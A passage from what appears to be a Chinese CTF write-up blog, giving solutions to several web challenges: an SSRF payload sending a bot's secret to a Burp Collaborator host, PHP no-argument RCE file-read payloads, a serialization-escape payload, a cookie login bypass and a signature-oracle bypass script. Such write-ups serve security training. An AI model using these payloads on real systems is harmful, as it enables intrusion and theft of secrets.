class="number">400</span>).fill(<span class="literal">null</span>))</span><br><span class="line"></span><br><span class="line">app.ws(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">ws, req</span>) =&gt;</span> &#123;</span><br><span class="line">    clients.push(ws);</span><br><span class="line">    ws.on(<span class="string">&#x27;message&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> str = data.toString();</span><br><span class="line">            <span class="keyword">let</span> x = str.slice(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">            <span class="keyword">let</span> y = str.slice(<span class="number">3</span>, <span class="number">6</span>);</span><br><span class="line">            <span class="keyword">let</span> color = str.slice(<span class="number">6</span>);</span><br><span class="line">            <span class="keyword">if</span> (setPixel(x, y, color, ws, req.token.cooldown)) &#123;</span><br><span class="line">                placers[<span class="built_in">JSON</span>.parse(x)][<span class="built_in">JSON</span>.parse(y)] = ws;</span><br><span class="line">                ws.send(Buffer.from([<span class="number">3</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123; <span class="built_in">console</span>.error(err); &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    ws.on(<span class="string">&#x27;close&#x27;</span>, <span class="function">() =&gt;</span> &#123; <span class="comment">/* Remove ws client from clients list */</span> &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>以及作弊者<code>BOT</code>的特殊客户端</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">const jwt = require(&#x27;jsonwebtoken&#x27;);</span><br><span class="line">const axios = require(&#x27;axios&#x27;);</span><br><span class="line"></span><br><span class="line">let canvas = document.querySelector(&#x27;canvas&#x27;);</span><br><span class="line">/* Initialize canvas */</span><br><span class="line"></span><br><span class="line">let secret = &#x27;seeeeecret&#x27;;</span><br><span class="line">axios.defaults.baseURL = `http://place:3000/stats/`;</span><br><span class="line">axios.defaults.headers.common[&#x27;Secret&#x27;] = secret;</span><br><span class="line">let cooldown = 1;</span><br><span class="line"></span><br><span class="line">function fixImage() &#123; /* Send WebMessages via `conn` to draw a static image */ &#125;</span><br><span class="line"></span><br><span class="line">let conn = new WebSocket(&#x27;ws://place:3000/&#x27;, &#123;</span><br><span class="line">    headers: &#123;</span><br><span class="line">        &#x27;Cookie&#x27;: `token=$&#123;jwt.sign(&#123; cooldown &#125;, secret, &#123; algorithm: &#x27;HS256&#x27; &#125;)&#125;`</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">conn.onopen = function () &#123;</span><br><span class="line">    console.log(&#x27;Bot connected to hacker/place&#x27;);</span><br><span class="line">    setInterval(fixImage, cooldown * 1050);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">conn.on(&#x27;message&#x27;, function (data) &#123;</span><br><span class="line">    let type = data.readUint8();</span><br><span class="line">    switch (type) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            //Same as client-side, but make changes on a local canvas</span><br><span class="line">            break;</span><br><span class="line">        case 2:</span><br><span class="line">            //Same as client-side, but make changes on a local canvas</span><br><span class="line">            break;</span><br><span class="line">        case 3:</span><br><span class="line">            //no-op</span><br><span class="line">            break;</span><br><span class="line">        case 4:</span><br><span class="line">            try &#123;</span><br><span class="line">                let str = data.toString();</span><br><span class="line">                let x = JSON.parse(str.slice(1, 4));</span><br><span class="line">                let y = JSON.parse(str.slice(4, 7));</span><br><span class="line">                let color = JSON.parse(str.slice(7));</span><br><span class="line">                try &#123;</span><br><span class="line">                    color = color.replace(&#x27;://&#x27;, &#x27;&#x27;)    //filtering</span><br><span class="line">                &#125; catch (err) &#123; &#125;</span><br><span class="line"></span><br><span class="line">                console.log(`Logging opposing pixel placed at $&#123;x&#125;, $&#123;y&#125; with color $&#123;color&#125;`);</span><br><span class="line">                axios(color, &#123;</span><br><span class="line">                    method: &#x27;post&#x27;,</span><br><span class="line">                    data: &#123; x, y &#125;</span><br><span class="line">                &#125;).catch((err) =&gt; &#123;&#125;);</span><br><span class="line">            &#125; catch (err) &#123; console.error(&#x27;error&#x27;); &#125;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>服务器发送的消息会无过滤的被bot接收，因此如果我们传递被污染的数据，就可以实现攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">axios(color, &#123;</span><br><span class="line">    method: &#x27;post&#x27;,</span><br><span class="line">    data: &#123; x, y &#125;</span><br><span class="line">&#125;).catch((err) =&gt; &#123;&#125;);</span><br></pre></td></tr></table></figure>
<p>利用color传递，双写<code>://</code>绕过黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">196152&quot;http://q908xuw4f7knrxw5amife5lz3q9gx5.burpcollaborator.net&quot;</span><br></pre></td></tr></table></figure>
<p>得到了bot的screat值，可以伪造jwt令牌。<br>得到flag</p>
<h1 id="BUU练习"><a href="#BUU练习" class="headerlink" title="BUU练习"></a>BUU练习</h1><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>git源码泄露<br>获取源码后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>主要目标是采用递归模式的oho无参rce</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>只能接受<code>phpinfo(phpinfo(phpinfo()))</code>类似的输入<br>目标是读取flag.php<br>利用<code>PHPSESSID</code>传入参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PHP中可用于读取文件的函数</span><br><span class="line">file_get_contents()</span><br><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br><span class="line">fgets()</span><br><span class="line">file()</span><br><span class="line">readfile()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">highlight_file()</span><br><span class="line">?exp=highlight_file(session_id(session_start()));</span><br><span class="line"></span><br><span class="line">show_source()</span><br><span class="line">?exp=show_source(session_id(session_start()));</span><br><span class="line"></span><br><span class="line">file()</span><br><span class="line">?exp=print_r(file(session_id(session_start())));</span><br><span class="line"></span><br><span class="line">readfile()</span><br><span class="line">?exp=readfile(session_id(session_start()));</span><br></pre></td></tr></table></figure>
<p>得到flag。</p>
<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>打开网页得到源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">$function = @$_GET[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#x27;img_path&#x27;])&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">if($function == &#x27;highlight_file&#x27;)&#123;</span><br><span class="line">    highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">&#125;else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br><span class="line">&#125;else if($function == &#x27;show_image&#x27;)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>看到了经典的<code>unserialize</code>反序列化函数和<code>file_get_contents</code>危险函数<br>寻找利用方法<br>查看给出的phpinfo，发现可疑页面<code>d0g3_f1ag.php</code><br>由于存在<code>extract($_POST);</code>,我们可以自定义传入的字符表，可以改变<code>_SESSION[]</code>的名称和内容，所以我们的目标就是要让进入最后一个函数的时候，序列化字符串中的<code>img</code>的值等于我们想要的文件名，<br>但由于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(!$_GET[&#x27;img_path&#x27;])&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>img</code>的内容不能直接在post中定义，同时我们发现了在覆盖函数后面存在过滤函数，不由得让我们联想到字符过滤带来的序列化字符逃逸。如果能够将第一个键的值改为<code>s:3:&quot;img&quot;;s:xx:&quot;base64(目标文件)&quot;;&#125;被舍弃的本来的img和值</code>就能在反序列化的时候构造我们想要的值<br>构建脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;img&#x27;] = &#x27;ZDBnM19mMWFnLnBocA==&#x27;;</span><br><span class="line">$_SESSION[&#x27;flagphp&#x27;] = &#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;;</span><br><span class="line">echo serialize($_SESSION);</span><br><span class="line">#a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:7:&quot;flagphp&quot;;s:38:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>当phpflag被过滤之后其中的<code>s:7&quot;</code>包括了<code>&quot;;s:38:</code>，并把这个作为键名，后面的内容就逃逸出来了。可以构造<code>s:1:&quot;1&quot;</code>作为他的值，使得后面的img覆盖<code>$_SESSION[&#39;img&#39;]</code>达到自定义img值的目的。<br>完整payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagphp]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag的真正位置，再次构造，得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagphp]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:24:&quot;ZDBnM19mbGxsbGxsYWcucGhw&quot;;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>打开网址，发现是登陆页面，没有注册页面，考虑sql注入，没有反应<br>看到提示使用cookie，抓包查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?action=login&amp;username=admin&amp;password=admin</span><br></pre></td></tr></table></figure>
<p>使用username=admin登录，<br>直接获得flag</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/18/4-20/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/18/4-20/" class="post-title-link" itemprop="url">4-20</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-04-18 18:45:37" itemprop="dateCreated datePublished" datetime="2022-04-18T18:45:37+08:00">2022-04-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-04-20 18:14:45" itemprop="dateModified" datetime="2022-04-20T18:14:45+08:00">2022-04-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p> 这周准备期中考试，就做的少了点</p>
<h1 id="DCTF2022"><a href="#DCTF2022" class="headerlink" title="DCTF2022"></a>DCTF2022</h1><h2 id="sql-tutor"><a href="#sql-tutor" class="headerlink" title="sql tutor"></a>sql tutor</h2><p>打开网页，得到一个sql查询网页，提供了有限的sql查询语句<br>考虑是否可以自定义sql查询语句获得flag，<br>存在范围超大的黑名单，屏蔽了绝大部分关键符号<br>查看过滤过程<br>抓包查看<br>发现存在debug模式，查看debug和回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">REQUEST</span><br><span class="line">POST /execute HTTP/2</span><br><span class="line"></span><br><span class="line">Host: sqltutor.dragonsec.si</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"></span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">Content-Length: 78</span><br><span class="line"></span><br><span class="line">Origin: https://sqltutor.dragonsec.si</span><br><span class="line"></span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text=TWluYQ%3D%3D&amp;signature=502b4c8afdf494054a5fbc2ab7e48a6f0e58c16e&amp;queryNo=0&amp;debug=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RESPONSE</span><br><span class="line">&#123;&quot;status&quot;:&quot;ok&quot;,&quot;trimmedText&quot;:&quot;TWluYQ==&quot;,&quot;signature&quot;:&quot;502b4c8afdf494054a5fbc2ab7e48a6f0e58c16e&quot;,&quot;debug&quot;:&#123;&quot;input&quot;:&#123;&quot;alg&quot;:&quot;sha1&quot;,&quot;text&quot;:&quot;TWluYQ==&quot;&#125;,&quot;steps&quot;:[&quot;Selected sha1 algorithm ✅&quot;,&quot;Decoded text from base64 ✅&quot;,&quot;Trimmed and checked the text ✅&quot;,&quot;Created signature: sha1(secret+sanitize(text)) ✅&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">REQUEST</span><br><span class="line">POST /verify_and_sign_text HTTP/2</span><br><span class="line"></span><br><span class="line">Host: sqltutor.dragonsec.si</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"></span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">Content-Length: 26</span><br><span class="line"></span><br><span class="line">Origin: https://sqltutor.dragonsec.si</span><br><span class="line"></span><br><span class="line">Te: trailers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text=TWluYQ%3D%3D&amp;alg=sha1&amp;debug=1</span><br><span class="line"></span><br><span class="line">RESPONSE</span><br><span class="line">&#123;&quot;status&quot;:&quot;error&quot;,&quot;message&quot;:&quot;Invalid text signature, this incident will be reported!&quot;,&quot;debug&quot;:&#123;&quot;input&quot;:&#123;&quot;signature&quot;:&quot;502b4c8afdf494054a5fbc2ab7e48a6f0e58c16e&quot;,&quot;text&quot;:&quot;TWluYSM=&quot;&#125;,&quot;steps&quot;:[&quot;Decoded text from base64 ✅&quot;,&quot;Selected query #0 ✅&quot;],&quot;compare&quot;:&quot;8d6039b90ee87591d168d2955b2a67af7899ccb2 !== 502b4c8afdf494054a5fbc2ab7e48a6f0e58c16e&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>存在两个请求，第一个请求根据请求的字符串会构造一个sha1的编码，第二次请求时会再次构造一次编码，通过两次比对判断是否改变了字符串值，而黑名单过滤只存在与第一次请求中。<br><code>&quot;compare&quot;:&quot;8d6039b90ee87591d168d2955b2a67af7899ccb2 !== 502b4c8afdf494054a5fbc2ab7e48a6f0e58c16e&quot;</code><br>因此可以构造解题路径<br>第一次携带非法数据请求<code>verify_and_sign_text</code>通过回显获得sha1的值，<br>再次请求该页面，通过第一次得到的sha1值通过检测<br>手工过于耗时，使用脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url= &quot;https://sqltutor.dragonsec.si/execute&quot;</span><br><span class="line">payload =&quot;Mina&quot;.encode(&#x27;utf-8&#x27;)</span><br><span class="line">encoded=base64.b64encode(payload).decode(&#x27;utf-8&#x27;)</span><br><span class="line">data = &#123;</span><br><span class="line">&quot;text&quot;:encoded,</span><br><span class="line">&quot;signature&quot;:&quot;dummy&quot;,</span><br><span class="line">&quot;queryNo&quot;:&quot;0&quot;,</span><br><span class="line">&quot;debug&quot;:&quot;true&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r1= requests.post(url,data=data)</span><br><span class="line">print(r1.text)</span><br><span class="line">resp=r1.text</span><br><span class="line">signature= resp.split(&#x27;&quot;compare&quot;:&quot;&#x27;)[1][0:40]</span><br><span class="line"></span><br><span class="line">data[&quot;signature&quot;]=signature</span><br><span class="line">r2= requests.post(url,data=data)</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;error&quot;,&quot;message&quot;:&quot;Invalid text signature, this incident will be reported!&quot;,&quot;debug&quot;:&#123;&quot;input&quot;:&#123;&quot;signature&quot;:&quot;dummy&quot;,&quot;text&quot;:&quot;TWluYQ==&quot;&#125;,&quot;steps&quot;:[&quot;Decoded text from base64 ✅&quot;,&quot;Selected query #0 ✅&quot;],&quot;compare&quot;:&quot;502b4c8afdf494054a5fbc2ab7e48a6f0e58c16e !== dummy&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;status&quot;:&quot;ok&quot;,&quot;query&quot;:&quot;SELECT * FROM users WHERE users.name=&#x27;Mina&#x27;&quot;,&quot;results&quot;:[&#123;&quot;id&quot;:5,&quot;name&quot;:&quot;Mina&quot;,&quot;surname&quot;:&quot;Lang&quot;,&quot;age&quot;:29&#125;],&quot;description&quot;:&quot;This query selects all users with the name &#x27;Mina&#x27;.&quot;,&quot;debug&quot;:&#123;&quot;input&quot;:&#123;&quot;signature&quot;:&quot;502b4c8afdf494054a5fbc2ab7e48a6f0e58c16e&quot;,&quot;text&quot;:&quot;TWluYQ==&quot;&#125;,&quot;steps&quot;:[&quot;Decoded text from base64 ✅&quot;,&quot;Selected query #0 ✅&quot;,&quot;Confirmed text and signature match ✅&quot;,&quot;Executed query ✅&quot;]&#125;</span><br></pre></td></tr></table></figure>
